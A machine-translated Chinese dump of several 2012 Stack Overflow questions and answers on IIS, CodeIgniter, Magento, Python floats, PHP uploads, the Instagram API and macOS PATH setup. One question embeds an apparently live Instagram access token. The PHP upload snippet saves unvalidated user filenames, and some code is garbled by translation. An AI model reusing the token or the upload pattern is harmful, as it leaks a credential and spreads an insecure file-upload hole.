10-11 17:20:40.161: ERROR/AndroidRuntime(5810):     at android.view.ViewGroup.drawChild(ViewGroup.java:1638)
10-11 17:20:40.161: ERROR/AndroidRuntime(5810):     at android.view.ViewGroup.dispatchDraw(ViewGroup.java:1367)
10-11 17:20:40.161: ERROR/AndroidRuntime(5810):     at android.view.View.draw(View.java:6743)
10-11 17:20:40.161: ERROR/AndroidRuntime(5810):     at android.widget.FrameLayout.draw(FrameLayout.java:352)
10-11 17:20:40.161: ERROR/AndroidRuntime(5810):     at com.android.internal.policy.impl.PhoneWindow$DecorView.draw(PhoneWindow.java:1842)
10-11 17:20:40.161: ERROR/AndroidRuntime(5810):     at android.view.ViewRoot.draw(ViewRoot.java:1407)
10-11 17:20:40.161: ERROR/AndroidRuntime(5810):     at android.view.ViewRoot.performTraversals(ViewRoot.java:1163)
10-11 17:20:40.161: ERROR/AndroidRuntime(5810):     at android.view.ViewRoot.handleMessage(ViewRoot.java:1727)
10-11 17:20:40.161: ERROR/AndroidRuntime(5810):     at android.os.Handler.dispatchMessage(Handler.java:99)
10-11 17:20:40.161: ERROR/AndroidRuntime(5810):     at android.os.Looper.loop(Looper.java:123)
10-11 17:20:40.161: ERROR/AndroidRuntime(5810):     at android.app.ActivityThread.main(ActivityThread.java:4627)
10-11 17:20:40.161: ERROR/AndroidRuntime(5810):     at java.lang.reflect.Method.invokeNative(Native Method)
10-11 17:20:40.161: ERROR/AndroidRuntime(5810):     at java.lang.reflect.Method.invoke(Method.java:521)
10-11 17:20:40.161: ERROR/AndroidRuntime(5810):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:868)
10-11 17:20:40.161: ERROR/AndroidRuntime(5810):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:626)
10-11 17:20:40.161: ERROR/AndroidRuntime(5810):     at dalvik.system.NativeStart.main(Native Method) 
```

# c# - 每次 IIS 重新启动时如何执行一些代码

> ID：12839034
> 
> 赞同：2
> 
> 时间：2012-10-11T11:59:59.773
> 
> 标签：c#, iis, httpmodule

我有一个静态数据列表。每次重新启动 IIS 时，我都想用数据填充这个列表，这意味着：在有人进入站点之前填充列表。

谁能给个答案？？？

我听说过“热身模块”……但我不知道如何使用它……

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-11T12:06:06.770

您可以使用 WebActivator（作为 nuget 包提供）在您的网络应用程序启动时执行一些代码。

或者在 global.asax 中使用 Application_Start()。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-11T12:08:00.583

您可以将数据实现为单例属性吗？

```
private object myListOfData;

object MyListOfData
{
    get
    {
        if (myListOfData == null)
            myListOfData = CodeYouWantToRunOnIisResart();

        return myListOfData;
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-11T12:10:12.680

您可以使用 IServiceBehavior 接口。

[http://msdn.microsoft.com/en-us/library/system.servicemodel.description.iservicebehavior.aspx](http://msdn.microsoft.com/en-us/library/system.servicemodel.description.iservicebehavior.aspx)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-11T12:09:49.117

您可以`Application_Start event`在`global.asax`.

链接： http: [//msdn.microsoft.com/en-us/library/ms178473 (v=vs.100).aspx](http://msdn.microsoft.com/en-us/library/ms178473(v=vs.100).aspx)

样本

```
void Application_Start(object sender, EventArgs e)
{
      // Code that runs on application startup
} 
```

链接： http: [//msdn.microsoft.com/en-us/library/microsoft.biztalk.kwtpm.tppubwebservice.global.application_start (v=bts.10).aspx](http://msdn.microsoft.com/en-us/library/microsoft.biztalk.kwtpm.tppubwebservice.global.application_start(v=bts.10).aspx)

# php - 在 Jamie Rumbelow MY_model 中使用关系

> ID：12839037
> 
> 赞同：0
> 
> 时间：2012-10-11T12:00:14.660
> 
> 标签：php, codeigniter, relationship, has-many, belongs-to

我正在使用 MY_model 作为 Codeigniter [-base-model](https://github.com/jamierumbelow/codeigniter-base-model)。我无法让基本关系正常工作。我搜索了很多，但可以找到解决方案。

* * *

首先，我有 2 个类`item_model.php`，`user_model.php`并且都扩展了 MY_Model。

在`item_model`课堂上我已经定义

```
public $belongs_to = array( 'user' => array( 'model' => 'user_model') ); 
```

并且在`user_model`

```
public $has_many = array( 'items' => array( 'model' => 'item_model') ); 
```

现在，当我打电话时在控制器中

```
$item_details = $this->item_model->with('user')->find_by_id($item_id); 
```

我得到了正确的数据，`$item_details`但我无法从“用户”关系中获取信息。 `$item_details->user_id->username;`.

我收到以下错误

> 消息：试图获取非对象的属性

表为标准

```
users table has id, username, ...
item table has id, user_id, title...

user_id is is setUp as FK to users.id. 
```

请帮忙。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T19:24:50.120

不`$item_details->user_id->username;`应该`$item_details->user->username;`吗？

您的用户表也称为`user`or `users`？你在这里告诉它调用它`user`：

```
public $belongs_to = array( 'user' => array( 'model' => 'user_model') ); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-05-16T00:03:49.020

如果你检查相关（）方法的源代码，你会发现这段代码：

```
if (is_string($value))
        {
            $relationship = $value;
            $options = array( 'primary_key' => $value . '_id', 'model' => $value . '_model' );
        }
        else
        {
            $relationship = $key;
            $options = $value;
        } 
```

我查看了源代码，如果你使用数组来定义模型，你还需要定义'primary_key'，这不在文档中。

'primary_key' 表示这个表的哪个外键链接我的primary_key。

```
public $belongs_to = array( 'user' => array( 'model' => 'user_model','primary_key'=>'user_id') ); 
```

会更对。

# magento - 在下订单之前附加产品

> ID：12839039
> 
> 赞同：0
> 
> 时间：2012-10-11T12:00:18.170
> 
> 标签：magento

我遇到了一种情况，我们需要根据购物车物品附加一些产品。但我们不希望客户看到有条件的产品。有没有办法在下订单之前添加某些产品？

我为事件创建了一个观察者`sales_order_place_before`并检查了订单项目并获取了我们需要添加的条件产品。但是，现在我应该如何将这些产品附加到将要创建的订单中？

任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-22T20:18:01.950

添加我自己的答案以帮助其他有同样问题的人。

在`config.xml`

```
<events>
    <sales_order_save_after>
        <observers>
            <specialitem>
                <type>singleton</type>
                <class>specialitem/observer</class>
                <method>attachSpecialItem</method>
            </specialitem>
        </observers>
    </sales_order_save_after>
</events> 
```

在`Observer.php`

```
public function attachSpecialItem(Varien_Event_Observer $obs) {

    $order = $obs->getEvent()->getOrder();
    $sku = 'SKU OF PRODUCT TO ADD DYNAMICALLY';
    $product = Mage::getModel('catalog/product')->loadByAttribute('sku', $sku);
    $qty = 1;

    $rowTotal = $product->getPrice();
    $order_item = Mage::getModel('sales/order_item')
            ->setStoreId($order->getStore()->getStoreId())
            ->setQuoteItemId(NULL)
            ->setQuoteParentItemId(NULL)
            ->setProductId($product->getId())
            ->setProductType($product->getTypeId())
            ->setQtyBackordered(NULL)
            ->setTotalQtyOrdered($qty)
            ->setQtyOrdered($qty)
            ->setName($product->getName())
            ->setSku($product->getSku())
            ->setPrice($product->getPrice())
            ->setBasePrice($product->getPrice())
            ->setOriginalPrice($product->getPrice())
            ->setRowTotal($rowTotal)
            ->setBaseRowTotal($rowTotal)
            ->setOrder($order);
    $order_item->save();
} 
```

# iphone - 查看中心物业

> ID：12839045
> 
> 赞同：-1
> 
> 时间：2012-10-11T12:00:46.003
> 
> 标签：iphone, objective-c, ios

我有两种看法。一个是父视图，另一个是子视图。假设父视图的宽度和高度为 480 X 320，子视图的宽度和高度为 1600 X 320。现在我想滚动子视图并确保它在内容大小结束时停止。我知道它可以通过 UIScrollView 来实现，但我想在不使用 UISCrollView 的情况下做到这一点。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T14:11:50.827

因此，如果我理解正确：您有一个“screenView”（剪辑到边界的较小视图）和一个“contentView”（作为“screenView”子视图的大视图）并且您想移动contentView 但您无法计算中心边界的位置，以便 contentView 始终与 screenView 完全重叠。

```
CGFloat xMin = screenView.frame.size.width - contentView.frame.size.width*.5f;
CGFloat yMin = screenView.frame.size.height - contentView.frame.size.height*.5f;

CGFloat xMax = contentView.frame.size.width*.5f;
CGFloat yMax = contentView.frame.size.height*.5f; 
```

# javascript - div下的画布阻止jquery事件IE9

> ID：12839047
> 
> 赞同：0
> 
> 时间：2012-10-11T12:00:47.867
> 
> 标签：javascript, jquery, html, canvas

我在 div 下有一个画布，并试图在 div 上获取 mouseenter 事件。这适用于所有其他浏览器。但是当我在 IE9 中尝试它时它失败了。您可以看到画布位于 div 下方，但事件未触发。

还有其他方法可以做到这一点吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T12:05:27.430

尝试将背景设置为图像并使其透明。它与在 IE 中导致问题的 hasLayout 属性有关。

# php - 即使更改 php.ini 文件，图像也不会上传

> ID：12839049
> 
> 赞同：0
> 
> 时间：2012-10-11T12:00:49.770
> 
> 标签：php, mysql, centos, uploading

我在我的 VPS 中增加了我的 php.ini 文件的值，然后我重新启动了我的服务器 + 重新启动的服务。仍然没有上传超过 5 MB。我正在使用以下代码进行上传。我正在上传具有正确图像扩展验证的图像。

```
$target_path = "uploads/"; 
$target_path = $target_path . basename( $_FILES['uploadedfile']['name']);
if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
    echo "The file ". basename( $_FILES['uploadedfile']['name']). " has been uploaded"; 
}
else{ 
    echo "There was an error uploading the file, please try again!"; 
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T12:06:28.790

我相信有几个选项会影响最大上传大小，您是否尝试过增加每个选项；

```
post_max_size = 128M
upload_max_filesize = 128M
memory_limit = 256M
max_input_time = 60 
```

* * *

ssh 到您的服务器，输入`sudo tail /var/log/apache2/error.log`输出并将其发布到您的问题中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T13:41:06.467

请尝试增加`max_execution_time`配置`php.ini`文件

# asp.net-mvc-3 - JavaScript Html.DropDownList 和模型视图控制器

> ID：12839055
> 
> 赞同：1
> 
> 时间：2012-10-11T12:01:08.227
> 
> 标签：asp.net-mvc-3

我有一个自定义 MVC 项目。我正在使用 Jquery，但我不擅长它。我创建了两个下拉列表。除了其他控件，我还有一个 dropdownlist1、锚链接删除和另一个 dropdownlist2 和一个文本框。

当我单击第一个下拉列表时，我正在使用 Jquery 并从控制器中获取数据。选定的值将显示在标签中，第二个下拉列表将填充为来自控制器的 Viewdata。

我必须通过 javascript/Jquery 完成所有这些工作。

```
function GetRuleCondition() {

     var e = document.getElementById("FilterCondition");         
     if (e.value != "") {
         action = 'RuleCondition/RuleSettings?FilterCondition=' + e.value;
         $.getJSON(action, function (data) {
             if (data != null) {
                 PopulateFilterCondition(data);
             }
             //alert(data);
             // for (var i = 0; i < data.length; i++) {
             //         $("#FilterRule").append(
             //         $('<option />', {
             //         'value': data[i].id,
             //         'name': data[i].name,
             //         'text': data[i].name
             //     })
             // );   
         });
     }
     e.SelectedIndex=0;
 }

 function PopulateFilterCondition(data) {
     addlist();
     var str = data.toString();
     var array = str.split(",");
     var e = document.getElementById("FilterCondition");
     var labels = document.getElementsByTagName('label');
     var numi = document.getElementById('theValue').value;
     if (document.getElementById("LblFilterConditionName" + numi)) {
         var lblname = document.getElementById("LblFilterConditionName" + numi);
         lblname.innerHTML = e.options[e.selectedIndex].value;
     }
 }

 function addlist() {
     var control = document.getElementById("FilterLst0");
     var lst = document.getElementById("FilterLst");
     var i = 1;
     //control = control;
     //if (control.style.visibility == "visible" || control.style.visibility != "") {
         control.style.display ="none";
    // }
     var div = document.getElementById('UnOrderLst');
     var numi = document.getElementById('theValue');
     num = (document.getElementById('theValue').value - 1) + 2;
     numi.value = num;
     var divIdName = lst + num;
     var lblFilterid = "LblFilterConditionName" + num;
     //         // var ConditionDrpdwnlst = document.getElementById('FilterRuleCondition'); <%= Html.DropDownList('FilterRuleCondition', (SelectList)ViewData['FilterRuleCondition'])%>
     var content = "<li class='lstclass' id= '" + divIdName + "'><a href='#' onfocus='blur();' class='icon cancel'>Cancel</a><label class='frmLabel' id='" +lblFilterid +"'></label><div class='ddComponent'>Dropdownlist</div><span class='inputBX conTrol'><input type='text' class='inputTXT conTrol'></span></li>";
     //alert(content);
     div.innerHTML += content;
     //var lblname = document.getElementById(lblFilterid); //.value = e.value;
     ////         if (e != null && lblname != null) {
     //lblname.innerHTML = e.options[e.selectedIndex].value; 
```

请让我知道如何完成这项任务，因为我迫切需要它。

# java - HttpServletResponse 编码问题

> ID：12839057
> 
> 赞同：0
> 
> 时间：2012-10-11T12:01:14.747
> 
> 标签：java

I have an API that returns JSON, it actually returns it using the default encoding (I believe it's UTF-8), but japanese and arabic characters are displayed as ??? or some junk

My question is: is there an easy way to display japanese characters ? I tried by setting page encoding to UTF-8 but it doesn't work.Can any body suggest solution?

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-11T12:08:21.853

如果某处没有错误，它应该可以使用 UTF-8。看：

*   [测试](http://winrus.com/utf8-jap.htm)
*   [文章](http://www.sljfaq.org/afaq/encodings.html)

这是[平假名](http://en.wikipedia.org/wiki/Hiragana)日文字母[UTF-8编码页面](http://www.utf8-chartable.de/unicode-utf8-table.pl?start=12352)。

~~所以，我认为你犯了一个错误，或者你的 API 没有完成它的工作。~~

编辑：

正如 duffymo 在评论您的问题时指出的那样：

> JSON 未编码或显示未正确解释它们。只需检查两个点。一个或两个都可能是错误的

# python - Python 浮点数

> ID：12839060
> 
> 赞同：5
> 
> 时间：2012-10-11T12:01:23.247
> 
> 标签：python

> **可能重复：**
> [python中的浮点相等](https://stackoverflow.com/questions/4028889/floating-point-equality-in-python)

我有一个关于我的 Python 代码的小“问题”（我现在在 ika 游戏引擎中使用 2.5 版）。我目前为我的游戏编写对象脚本，我想知道比较两个浮点数是否安全这种方式：

我将做一个简短的例子来说明我目前所做的事情。

每个对象都有一个速度，从 0 到 9，以浮点数表示。例如

```
speed = 4.83
cord_x = 10.0
cord_y = 10.0 
```

他们有一个 AddMovement 方法。这将设置 X、Y 值，并表示对象的目标坐标。

```
target_x = 25.0
target_x = 26.75
movement = True # This represents if the object is moveing or not 
```

每一帧，最大速度等于这个值：

```
maximum_x_speed = abs(cord_x-target_x)
maximum_y_speed = abs(cord_y-target_y) 
```

真正的速度将是：

```
# Get the real X speed in this frame
if maximum_x_speed < speed:
    real_x_speed = maximum_x_speed
else:
    real_x_speed = speed

# Get the real Y speed in this frame
if maximum_y_speed < speed:
    real_y_speed = maximum_y_speed
else:
    real_y_speed = speed 
```

现在，基于这个 real_x_speed 值和 real_y_speed 值，我从坐标中减去这个值。

```
if target_x < cord_x:
    cord_x -= real_x_speed
elif target_x > cord_x:
    cord_x += real_x_speed
if target_y < cord_y:
    cord_y -= real_y_speed
elif target_y > cord_y:
    cord_y += real_y_speed 
```

最后，我检查平等

```
if cord_x == target_x and cord_y == target_y:
    # Halt movement, reached goal
    movement = False 
```

我过去有浮点错误，0.1 问题，就像......我担心这会导致某种错误。或者这在逻辑上是不可能的？

如果我有语法错误，对不起。英语不是我的母语...如果我应该改变这个逻辑，我真的很感激一些提示。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-11T12:08:52.833

不，这种类型的代码绝不是一个好主意。

会有累积的浮点错误，使其很难跟踪。您确实应该使用“epsilon”方法，即如果差值小于某个设置常数（通常称为[epsilon](http://en.wikipedia.org/wiki/Machine_epsilon) ），则认为这两个值相等：

```
def floats_equal(x, y, epsilon = 1e-4):
  return abs(x - y) < epsilon 
```

当然，您必须`epsilon`根据应用程序的需要调整该值，但是值表示基于像素的位置的游戏不需要太高的精度。

请注意，正如其他答案中所指出的那样，有一个*最小*的epsilon 可以在机器上运行，但通常最好使用应用程序级 epsilon，例如上面的那个。出于演示目的在 2D 像素空间中插值时，很少有任何精度点在 2.22044604925 * 10 ^(-16)的数量级上，这恰好是`sys.float_info.epsilon`我本地系统上的值。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-10-11T12:10:40.070

通常最好这样做：

```
EPSILON = 0.00001 # or whatever 

if abs(cord_x - target_x) < EPSILON and abs(cord_y - target_y) < EPSILON:
    # Halt movement, reached goal
    movement = False 
```

有些人选择`EPSILON`成为：

```
import sys

sys.float_info.epsilon 
```

这是 1 与可表示为浮点数的大于 1 的最小值之间的差 -[这里](http://docs.python.org/py3k/library/sys.html#sys.float_info)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-11T12:24:28.400

简短的回答是你所做的很糟糕。长答案是正确的方法取决于你在做什么。看一下比较浮点数的几种不同方法：

[http://randomascii.wordpress.com/2012/02/25/comparing-floating-point-numbers-2012-edition/](http://randomascii.wordpress.com/2012/02/25/comparing-floating-point-numbers-2012-edition/)

如果您使用浮点数，则值得通读整本书。

# php - 来自小时数组 PHP 的时间块

> ID：12839064
> 
> 赞同：0
> 
> 时间：2012-10-11T12:01:25.190
> 
> 标签：php, arrays, multidimensional-array

希望有人可以提供帮助，因为我正在绞尽脑汁试图弄清楚。

我有一个我正在创建的新系统，它可以在用户可用和不可用的时间结束，我有两个数组：

可用的：

```
Array
(
    [0] => Array
        (
            [0] => 00:00:00
            [1] => 01:00:00
        )

    [1] => Array
        (
            [0] => 01:00:00
            [1] => 02:00:00
        )

    [2] => Array
        (
            [0] => 03:00:00
            [1] => 04:00:00
        )

    [3] => Array
        (
            [0] => 04:00:00
            [1] => 05:00:00
        )

) 
```

不可用：

```
Array
(
    [0] => Array
        (
            [0] => 02:00:00
            [1] => 03:00:00
        )

    [1] => Array
        (
            [0] => 05:00:00
            [1] => 06:00:00
        )

    [2] => Array
        (
            [0] => 06:00:00
            [1] => 07:00:00
        )

    [3] => Array
        (
            [0] => 07:00:00
            [1] => 08:00:00
        )

    [4] => Array
        (
            [0] => 08:00:00
            [1] => 09:00:00
        )

    [5] => Array
        (
            [0] => 09:00:00
            [1] => 10:00:00
        )

    [6] => Array
        (
            [0] => 10:00:00
            [1] => 11:00:00
        )

    [7] => Array
        (
            [0] => 11:00:00
            [1] => 12:00:00
        )

    [8] => Array
        (
            [0] => 12:00:00
            [1] => 13:00:00
        )

    [9] => Array
        (
            [0] => 13:00:00
            [1] => 14:00:00
        )

    [10] => Array
        (
            [0] => 14:00:00
            [1] => 15:00:00
        )

    [11] => Array
        (
            [0] => 15:00:00
            [1] => 16:00:00
        )

    [12] => Array
        (
            [0] => 16:00:00
            [1] => 17:00:00
        )

    [13] => Array
        (
            [0] => 17:00:00
            [1] => 18:00:00
        )

    [14] => Array
        (
            [0] => 18:00:00
            [1] => 19:00:00
        )

    [15] => Array
        (
            [0] => 19:00:00
            [1] => 20:00:00
        )

    [16] => Array
        (
            [0] => 20:00:00
            [1] => 21:00:00
        )

    [17] => Array
        (
            [0] => 21:00:00
            [1] => 22:00:00
        )

    [18] => Array
        (
            [0] => 22:00:00
            [1] => 23:00:00
        )

    [19] => Array
        (
            [0] => 23:00:00
            [1] => 00:00:00
        )

) 
```

每个数组都有小时槽，例如。12am-1am, 1am-2am 等

但我正试图找到一种方法来分组时间，例如。

可用：00:00:00 - 02:00:00 和 03:00:00 - 05:00:00 和不可用：05:00:00 - 00:00:00

任何人都可以提出任何解决方案吗？

谢谢。

-编辑- 只是为了澄清我所追求的：这是 1 人 1 天。如果他们把它们放在下午 6 点到 10 点之间可用，它将以小时的形式传递给我。18:00:00 - 19:00:00、19:00:00 - 20:00:00 等。但我只需要 18:00:00 - 22:00:00。谢谢。

我也可以使用这个数组：

```
Array 
```

（[0] => 数组（[0] => 00:00:00 [1] => 01:00:00 [2] => A）

```
[1] => Array
    (
        [0] => 01:00:00
        [1] => 02:00:00
        [2] => A
    )

[2] => Array
    (
        [0] => 02:00:00
        [1] => 03:00:00
        [2] => U
    )

[3] => Array
    (
        [0] => 03:00:00
        [1] => 04:00:00
        [2] => A
    )

[4] => Array
    (
        [0] => 04:00:00
        [1] => 05:00:00
        [2] => A
    )

[5] => Array
    (
        [0] => 05:00:00
        [1] => 06:00:00
        [2] => U
    )

[6] => Array
    (
        [0] => 06:00:00
        [1] => 07:00:00
        [2] => U
    )

[7] => Array
    (
        [0] => 07:00:00
        [1] => 08:00:00
        [2] => U
    )

[8] => Array
    (
        [0] => 08:00:00
        [1] => 09:00:00
        [2] => U
    )

[9] => Array
    (
        [0] => 09:00:00
        [1] => 10:00:00
        [2] => U
    )

[10] => Array
    (
        [0] => 10:00:00
        [1] => 11:00:00
        [2] => U
    )

[11] => Array
    (
        [0] => 11:00:00
        [1] => 12:00:00
        [2] => U
    )

[12] => Array
    (
        [0] => 12:00:00
        [1] => 13:00:00
        [2] => U
    )

[13] => Array
    (
        [0] => 13:00:00
        [1] => 14:00:00
        [2] => U
    )

[14] => Array
    (
        [0] => 14:00:00
        [1] => 15:00:00
        [2] => U
    )

[15] => Array
    (
        [0] => 15:00:00
        [1] => 16:00:00
        [2] => U
    )

[16] => Array
    (
        [0] => 16:00:00
        [1] => 17:00:00
        [2] => U
    )

[17] => Array
    (
        [0] => 17:00:00
        [1] => 18:00:00
        [2] => U
    )

[18] => Array
    (
        [0] => 18:00:00
        [1] => 19:00:00
        [2] => U
    )

[19] => Array
    (
        [0] => 19:00:00
        [1] => 20:00:00
        [2] => U
    )

[20] => Array
    (
        [0] => 20:00:00
        [1] => 21:00:00
        [2] => U
    )

[21] => Array
    (
        [0] => 21:00:00
        [1] => 22:00:00
        [2] => U
    )

[22] => Array
    (
        [0] => 22:00:00
        [1] => 23:00:00
        [2] => U
    )

[23] => Array
    (
        [0] => 23:00:00
        [1] => 00:00:00
        [2] => U
    ) 
```

)

但我只需要将它们分组。谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T12:19:37.000

我猜你想得到一个格式化的字符串输出。

您必须遍历数组键并检查两个数组。假设所有用户都存在于数组中`$available`，`$unavailable`您可以尝试这样的事情：

```
$userSlots = array();

foreach(array_keys($available) as $userKey) {

    $userSlots[ $userKey ] = 'Available: ';

    foreach ($available[ $userKey ] as $slot) {
       $userSlots[ $userKey ] .= $slot[ 0 ] . ' - ' . $slot[ 1 ] . ', ';
    }

    $aggregatedSlots .= 'Unavailable: ';

    foreach ($unavailable[ $userKey ] as $slot) {
       $userSlots[ $userKey ] .= $slot[ 0 ] . ' - ' . $slot[ 1 ] . ', ';
    }
} 
```

您将获得一个数组，其中 userKeys 作为键，格式化的“可用性”字符串作为值。当然，应该添加一些智能检查和字符串修改以避免尾随逗号。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T14:43:20.117

据我了解..您想将数组分成两组

*   答：可用
*   U：不可用

你可以只使用数组过滤器

```
$avialable =  array_filter($array,function($var) { return $var[2] == "A" ; });
$unavialabe =  array_filter($array,function($var) { return $var[2] == "U" ; }); 
```

# php - 无法打开流：HTTP 请求失败！HTTP/1.1 400 错误请求

> ID：12839065
> 
> 赞同：1
> 
> 时间：2012-10-11T12:01:32.010
> 
> 标签：php, json, request

我的代码：

```
function jsonCall()
{

    global $_SESSION;
    global $smarty;

    $client_id = "XXXXXXXX";
    $next_max_tag_id = 1349756086082;

    if(isset($_POST['nextSubmit']))
        {
            $next_max_tag_id = $_POST['next_max_tag_id'];
        }

    $url ='https://api.instagram.com/v1/tags/' . $_SESSION['zoekterm'] . '/media/recent?access_token=145408254.f59def8.448ef83c8fa740aa9744a0c47766a857&max_tag_id=' . $next_max_tag_id;

    $json = file_get_contents($url);
    $json_output = json_decode($json,true);

    file_put_contents('json/instagram.json',$json);

    $imagesErbuiten = array();

            foreach($json_output['data'] as $data)
            {
                foreach($data['images'] as $images)
                {
                    array_push($imagesErbuiten, $images);
                }
            }

    $smarty->assign('arrData',$imagesErbuiten);
    $smarty->assign('next_max_tag_id',$json_output['pagination']['next_max_tag_id']);
} 
```

我正在使用 Instagram API 和 Flickr API。当他们的搜索字段中有一个他们不知道的值时，两者都会得到相同的错误。

举个例子：

Instagram 不允许按色情、山雀等标签进行搜索……当这种情况发生时，您会收到 400 Bad 请求。当您搜索 QSDFQSDFQSDFQSDF （不存在以太）时，没有错误，只是因为搜索有效但数组为空（这很好，所以我可以显示“未找到任何内容”）。

这不是空间问题。我已经排除了所有空格并用 + 替换它们。

我的问题：

是否可以删除或修复此错误？一切正常，除了你在我的页面顶部遇到那个丑陋的错误。

问候，W.

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-11T12:26:39.590

一种替代方法是使用 cURL (http://php.net/manual/en/book.curl.php) 在打印之前获取有关请求的更多详细信息：

像这样的一些可能可以帮助你：

```
function url_get_contents ($Url) {
    if (!function_exists('curl_init')){ 
        die('CURL is not installed!');
    }
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $Url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $output = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); //get the code of request
    curl_close($ch);

    if($httpCode == 400) 
       return 'No donuts for you.';

    if($httpCode == 200) //is ok?
       return $output;

} 
```

# ajax - 从 ASP 中上传的 Excel 工作表 (.csv) 更新数据库表

> ID：12839069
> 
> 赞同：1
> 
> 时间：2012-10-11T12:01:51.210
> 
> 标签：ajax, asp-classic

我想制作一个 asp 页面，用户将在其中上传一个 csv 文件，该文件将动态显示，为用户提供两个选项 - 接受或拒绝显示的表格。如果用户单击接受，则应将 excel (csv) 文件直接更新到数据库中。

我已经做了以下事情：

1.  csv文件上传成功，表格动态显示。
2.  拒绝按钮，它将拒绝上传的文件并刷新页面。

我需要你的帮助来实现这一点：

在名为 update() 的函数中使用 ajax 脚本，它将使用 xmlhttp 对象链接所有参数（表的列）并将其传递给包含更新数据库代码的 asp 文件。

我希望你能明白。任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T12:04:33.480

使用 jQuery Ajax 函数来达到你想要的效果。你也可以用纯 javascript 编写你的 ajax 函数。

您可以找到有关它的详细信息：http: [//api.jquery.com/jQuery.ajax/](http://api.jquery.com/jQuery.ajax/)

# drupal-7 - Drupal Commerce - 销售摄影

> ID：12839078
> 
> 赞同：0
> 
> 时间：2012-10-11T12:02:19.100
> 
> 标签：drupal-7, webshop, photography, drupal-commerce

是否可以使用“drupal commerce”分发来销售摄影师的图像？

图像必须位于安全文件夹中。访客用visa或mastercard付款后，即可下载图片。事实上，它与任何其他图库摄影网店的原理相同。

如果是这样，你能给我一些关于如何开始构建它的提示吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T17:12:37.570

是的; 这可以通过 commerce_file 模块轻松完成。还有一个预先配置好的名为 commerce_downloads 的专用发行版。您可以使用它作为您的起点，或者将其设置在一个单独的目录中以查看它的配置方式，并将这些设置添加到您现有的商业站点（如果您已经有一个）。

您可以在此处查看有关它的截屏视频：

[http://commerceguys.com/blog/commerce-module-tuesday-commerce-file-screencast](http://commerceguys.com/blog/commerce-module-tuesday-commerce-file-screencast)

个人项目在这里：

[http://drupal.org/project/commerce_file](http://drupal.org/project/commerce_file)

[http://drupal.org/project/commerce_downloads](http://drupal.org/project/commerce_downloads)

# macos - mac osx，git mergetool，diffmerge，找不到命令

> ID：12839081
> 
> 赞同：1
> 
> 时间：2012-10-11T12:02:27.300
> 
> 标签：macos, bash, diffmerge

我在 Applications 文件夹中安装了 DiffMerge。我无法让 DiffMerge 自行运行，也无法在使用`git mergetool` My PATH 变量时运行：

```
/Applications/DiffMerge.app:/Applications/:/Applications/:/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin:/usr/local/git/bin:/usr/texbin:/usr/X11/bin$$$:/usr/X11/bin 
```

我错过了什么？谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-11T12:04:47.117

Mac App 包在文件夹中有可执行文件：

```
Contents/MacOS/ 
```

（[参考](http://developer.apple.com/library/mac/#documentation/CoreFoundation/Conceptual/CFBundles/BundleTypes/BundleTypes.html)）。

所以你的路径应该是：

```
/Applications/DiffMerge.app/Contents/MacOS:/usr/bin:...etc 
```

走在`/Applications/`这条路上是完全没有意义的。

# text - 随机文本生成器（每次都相同的顺序）

> ID：12839083
> 
> 赞同：0
> 
> 时间：2012-10-11T12:02:33.880
> 
> 标签：text, random, label, ios6, xcode4.5

嗨，我正在创建一个应用程序，当我按下按钮时，我有代码，它工作正常，但是当我运行应用程序并按下它显示的按钮时，我想更改一些东西：

“好吧，嗨，哟，哟，你好，好吧，嗨，哟，哟，嗨，你好，你好，好吧”

那是前 13 次点击，这就是我每次打开应用程序时的顺序。基本上我不希望他们连续重复两次，而且我希望他们在我启动应用程序时以不同的顺序启动。

还有 1 件事我希望能够写至少 2 行文本，但我如何使用标签来做到这一点？

这是我的代码：

。H

```
@interface ViewController1 : UIViewController  {

    IBOutlet UILabel *textview;

}

-(IBAction)random; 
```

.m

@接口 ViewController1 ()

@结尾

@实现视图控制器1

-（IBAction）随机{

```
int text = rand() % 5;

switch (text) {

    case 0:

        textview.text = @"Hello";

        break;

    case 1:

        textview.text = @"hi";

        break;

    case 2:

        textview.text = @"alright";

        break;

    case 3:

        textview.text = @"yoo";

        break;

    case 4:

        textview.text = @"hiya";

        break;

    default:

        break;

} 
```

}

谢谢你 ：）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T12:10:26.163

使用函数`arc4random()`而不是`random()`. 您面临的问题是因为该函数`rand`需要在调用之前设置种子。这是后台使用的随机数生成器的起始值`rand`。当你不使用自己的种子时，它总是相同的默认值，因此你总是得到相同的随机值序列。使用`arc4random`时无需播种。有关详细信息，请参阅[此博客文章](http://iphonedevelopment.blogspot.co.at/2008/10/random-thoughts-rand-vs-arc4random.html)和[文档](https://developer.apple.com/library/mac/#documentation/Darwin/Reference/ManPages/man3/arc4random.3.html)。

```
#include <stdlib.h>
...
